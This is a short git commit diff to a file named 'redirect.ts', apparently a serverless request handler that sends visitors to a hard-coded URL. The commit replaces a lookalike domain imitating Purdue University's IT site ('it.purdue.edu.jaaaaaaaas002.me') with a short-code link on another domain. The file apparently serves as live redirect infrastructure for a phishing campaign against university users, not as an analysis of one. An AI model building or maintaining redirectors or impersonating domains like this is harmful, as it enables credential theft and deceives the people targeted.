a9344fe994c672e6e0b813db70f08a555c4b600b
owostic101 <charles_still@aol.com>
2025-11-28 17:14:49 -0600

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://it.purdue.edu.jaaaaaaaas002.me/"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://lightedgee.com/DeRHdtUP"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
